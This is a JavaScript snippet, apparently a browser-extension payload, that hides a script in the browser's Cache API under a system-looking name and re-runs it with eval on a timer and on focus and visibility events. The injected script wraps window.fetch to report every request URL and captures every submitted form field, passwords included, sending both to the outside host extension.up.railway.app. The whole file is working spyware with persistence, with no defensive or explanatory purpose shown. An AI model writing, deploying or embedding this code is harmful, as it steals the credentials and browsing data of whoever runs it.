
// Cache API Persistent Injection
(function() {
    if ('caches' in window) {
        // Store malicious script in Cache API
        const maliciousScriptContent = `
            // Persistent script from Cache API
            (function() {
                console.log('Cache injector active');
                
                // Network interception
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    // Log request
                    fetch('https://extension.up.railway.app/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'cache_api_intercept',
                            url: args[0],
                            timestamp: new Date().toISOString(),
                            page: window.location.href
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                    
                    return originalFetch.apply(this, args);
                };
                
                // Form monitoring
                document.addEventListener('submit', function(e) {
                    const form = e.target;
                    const formData = new FormData(form);
                    const data = {};
                    
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    
                    fetch('https://extension.up.railway.app/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'cache_form_capture',
                            formData: data,
                            action: form.action,
                            timestamp: new Date().toISOString(),
                            page: window.location.href
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                });
            })();
        `;
        
        // Create and cache the malicious script
        const scriptResponse = new Response(maliciousScriptContent, {
            headers: { 'Content-Type': 'application/javascript' }
        });
        
        caches.open('system-cache').then(cache => {
            cache.put('https://system-script.local/injector.js', scriptResponse);
        });
        
        // Function to load and execute from cache
        function loadFromCache() {
            caches.open('system-cache').then(cache => {
                cache.match('https://system-script.local/injector.js').then(response => {
                    if (response) {
                        response.text().then(scriptText => {
                            if (!window.cacheInjectorActive) {
                                eval(scriptText);
                                window.cacheInjectorActive = true;
                            }
                        });
                    }
                });
            });
        }
        
        // Load immediately and on interval
        loadFromCache();
        setInterval(loadFromCache, 15000);
        
        // Load on page events
        window.addEventListener('focus', loadFromCache);
        document.addEventListener('visibilitychange', loadFromCache);
    }
})();
